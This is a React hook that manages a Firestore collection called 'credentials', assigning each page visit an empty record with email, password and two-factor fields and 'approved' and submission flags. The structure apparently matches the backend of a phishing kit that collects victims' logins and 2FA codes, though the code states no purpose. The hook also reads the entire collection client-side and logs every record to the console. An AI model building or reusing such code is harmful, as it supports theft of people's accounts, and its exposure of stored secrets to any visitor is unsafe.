import { useEffect, useState } from "react";
import { collection, getDocs, updateDoc, deleteDoc, doc, addDoc } from "firebase/firestore";
import { db } from "../../lib/firebase";

export default function useFirstTimeGetCred() {
  const [newCredential, setNewCredential] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const initializeCredentials = async () => {
      try {
        setIsLoading(true);
        setError(null);

        // Fetch all documents
        let querySnapshot;
        try {
          querySnapshot = await getDocs(collection(db, "credentials"));
          console.log("Fetched documents:", querySnapshot.docs.map((doc) => ({ id: doc.id, ...doc.data() })));
        } catch (err) {
          console.error("Error fetching documents:", err);
          throw new Error(`Failed to fetch documents: ${err.message}`);
        }

        // Update id: 0 to Firestore document ID
        const docs = [];
        for (const docSnapshot of querySnapshot.docs) {
          const data = docSnapshot.data();
          let updatedData = { ...data, id: docSnapshot.id };

          if (data.id === 0) {
            try {
              const docRef = doc(db, "credentials", docSnapshot.id);
              await updateDoc(docRef, {
                ...data,
                id: docSnapshot.id,
              });
              console.log(`Updated document ID from 0 to ${docSnapshot.id}`);
            } catch (err) {
              console.error(`Error updating document ${docSnapshot.id}:`, err);
              throw new Error(`Failed to update document ID: ${err.message}`);
            }
          }

          docs.push(updatedData);
        }
        console.log("Processed documents:", docs);

        // Filter documents with status: "new"
        const newDocs = docs.filter((doc) => doc.status === "new");
        console.log("Documents with status 'new':", newDocs);

        // Check for documents with status: "old", empty password, and empty twoFactor
        const oldDocsWithEmptyFields = docs.filter(
          (doc) =>
            doc.status === "old" &&
            doc.id &&
            typeof doc.id === "string" &&
            Object.keys(doc.password).length === 0 &&
            Object.keys(doc.twoFactor).length === 0
        );
        console.log("Old documents with empty password and twoFactor:", oldDocsWithEmptyFields);

        let selectedDoc = null;

        if (newDocs.length > 0) {
          // Select the first document with status: "new"
          selectedDoc = newDocs[0];
          console.log("Selected document with ID:", selectedDoc.id);

          // Validate selectedDoc.id
          if (!selectedDoc.id || typeof selectedDoc.id !== "string") {
            throw new Error("Invalid document ID for selected document");
          }

          // Update status to "old"
          try {
            await updateDoc(doc(db, "credentials", selectedDoc.id), {
              status: "old",
            });
            selectedDoc.status = "old";
            console.log("Updated selected document to status: old");
          } catch (err) {
            console.error(`Error updating status for document ${selectedDoc.id}:`, err);
            throw new Error(`Failed to update document status: ${err.message}`);
          }

          // Delete other documents with status: "new"
          const docsToDelete = newDocs.slice(1);
          for (const docToDelete of docsToDelete) {
            if (!docToDelete.id || typeof docToDelete.id !== "string") {
              console.warn("Skipping deletion of document with invalid ID:", docToDelete);
              continue;
            }
            try {
              await deleteDoc(doc(db, "credentials", docToDelete.id));
              console.log("Deleted document with ID:", docToDelete.id);
            } catch (err) {
              console.error(`Error deleting document ${docToDelete.id}:`, err);
              throw new Error(`Failed to delete document: ${err.message}`);
            }
          }
        } else if (oldDocsWithEmptyFields.length > 0) {
          // Use the first old document with empty password and twoFactor
          selectedDoc = oldDocsWithEmptyFields[0];
          console.log("Selected existing old document with empty password and twoFactor:", selectedDoc.id);
        } else {
          // Create a new document
          console.log("No suitable documents found, creating new document...");
          const newDocData = {
            status: "new",
            id: 0,
            email: {
              email: "",
              approved: false,
              emailSubmission: 0,
              isEmailError: false,
            },
            password: {},
            twoFactor: {},
          };
          let docRef;
          try {
            docRef = await addDoc(collection(db, "credentials"), newDocData);
            console.log("New document created with ID:", docRef.id);
          } catch (err) {
            console.error("Error creating new document:", err);
            throw new Error(`Failed to create new document: ${err.message}`);
          }
          const docId = docRef.id;

          // Validate docId
          if (!docId || typeof docId !== "string") {
            throw new Error("Invalid document ID returned by addDoc");
          }

          // Update id and status
          try {
            const newDocRef = doc(db, "credentials", docId);
            await updateDoc(newDocRef, {
              id: docId,
              status: "old",
            });
            console.log("Updated new document with ID:", docId, "and status: old");
          } catch (err) {
            console.error(`Error updating new document ${docId}:`, err);
            throw new Error(`Failed to update new document: ${err.message}`);
          }

          // Fetch the updated document
          try {
            const newDocSnapshot = await getDocs(collection(db, "credentials"));
            const newDoc = newDocSnapshot.docs
              .map((doc) => ({ id: doc.id, ...doc.data() }))
              .find((doc) => doc.id === docId);

            if (!newDoc) {
              throw new Error("Newly created document not found");
            }
            selectedDoc = newDoc;
            console.log("Selected new document:", selectedDoc);
          } catch (err) {
            console.error("Error fetching new document:", err);
            throw new Error(`Failed to fetch new document: ${err.message}`);
          }
        }

        // Set newCredential
        setNewCredential(selectedDoc);
        console.log("Set newCredential:", selectedDoc);
      } catch (err) {
        console.error("Error initializing credentials:", err);
        setError(err.message);
        setNewCredential(null);
      } finally {
        setIsLoading(false);
      }
    };

    initializeCredentials();
  }, []); // Run only once on mount

  return { newCredential, isLoading, error };
}